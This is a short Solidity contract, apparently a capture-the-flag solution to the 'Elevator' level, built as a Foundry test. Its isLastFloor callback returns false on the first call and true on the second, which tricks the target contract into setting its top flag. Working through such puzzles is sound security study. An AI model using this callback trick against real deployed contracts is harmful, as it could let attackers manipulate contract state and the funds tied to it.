// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Elevator.sol";

contract ElevatorAttacker {
    bool hasCalled = false;

    function attack(address target) public {
        console.log('attack');
        Elevator elevator = Elevator(target);

        elevator.goTo(1);
        require(elevator.top(), 'not top');
    }

    function isLastFloor(uint) external returns (bool) {
        if (hasCalled) {
            console.log("isLastFloor: true");
            return true;
        }
        hasCalled = true;
        console.log("isLastFloor: false");
        return false;
    }
}
